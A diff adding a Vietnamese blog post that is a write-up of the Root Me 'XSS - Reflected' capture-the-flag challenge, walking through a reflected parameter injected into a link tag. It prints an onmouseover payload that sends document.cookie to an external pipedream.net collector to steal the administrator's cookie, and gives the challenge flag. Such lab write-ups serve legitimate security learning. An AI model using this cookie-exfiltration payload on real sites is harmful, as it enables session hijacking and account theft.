@@ -141,6 +141,48 @@
             </div>
         </div>
     </div>
+    <header class="header-section ">
+        <div class="intro-header no-img">
+          <div class="container">
+            <div class="row">
+              <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                  <h1>Root me: XSS - Reflected</h1>
+                  <span class="post-meta">Posted on March 27, 2024</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+    </header>  
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <article role="main" class="blog-post">
+                    <h2 id="english-below">[WRITE - UP]</h2>     
+                        <p><a href="http://challenge01.root-me.org/web-client/ch26/">Link challenge</a>    
+                      <p>Tiếp tục với bài XSS, ở challenge này trước tiên mình view source code thì thấy 1 thẻ <strong>a</strong> bị comment, thẻ <strong>a</strong> dẫn đến <strong>?p=security</strong></p>      
+                      <p><img src="../../img/xss_reflected.png" alt="xss.PNG" /></p> 
+                      <p>Request đến ?p=security, website hiển thị trang web lỗi và có một hyperlink thẻ hiển thị nội dung <strong>security</strong></p>
+                      <p><img src="../../img/xss_reflected1.png" alt="xss.PNG" /></p> 
+                      <p>Thử nhập <strong>?p=giá trị khác</strong>, page sẽ báo lỗi và hiển thị nội dung <strong>giá trị khác</strong> trong thẻ <strong>a</strong></p>      
+                      <p><img src="../../img/xss_reflected2.png" alt="xss.PNG" /></p>
+                      <p>Như vậy giờ mình có thể chèn script để khai thác XSS thông qua thẻ <strong>a</strong></p>
+                      <p class="box-note">lebathanh' onmouseover='alert(1)</p>
+                      <p><img src="../../img/xss_reflected8.png" alt="xss.PNG" /></p>
+                      <p>Đến đây, mình đã thử get trực tiếp document.cookie nhưng không có giá trị, nên mình gửi <strong>HTTP Request</strong> và qua <strong>RequestBin</strong> để lấy cookie</p>
+                      <p class="box-note2">?p=lebathanh' onmouseover='document.location="https://eow2xczwnu5sb6g.m.pipedream.net?"
+                        .concat(document.cookie)</p>
+                      <p><img src="../../img/xss_reflected3.png" alt="xss.png" /></p>
+                      <p>Thực hiện request với payload, sau đó ta trigger event <strong>onmouseover</strong> và di chuyển chuột qua thẻ <strong>a</strong> để chuyển hướng website</p>
+                      <p><img src="../../img/xss_reflected7.png" alt="xss.png" /></p>  
+                      <p>Sau đó, ta thực hiện lại một lần nữa nhưng sẽ thực hiện thêm bước <strong>Report To The Administrator</strong> để POST request, và qua <strong>RequestBin</strong> lấy flag thôi^^^^^</p>
+                      <p><img src="../../img/xss_reflected6.png" alt="xss.png" /></p>
+                      <p class="box-note">Flag: s3rv3r_s1d3_xss_1s_w4y_m0r3_fun</p>
+              </article>
+            </div>
+        </div>
+    </div> 
   <footer>
     <div class="container beautiful-jekyll-footer">
       <div class="row">
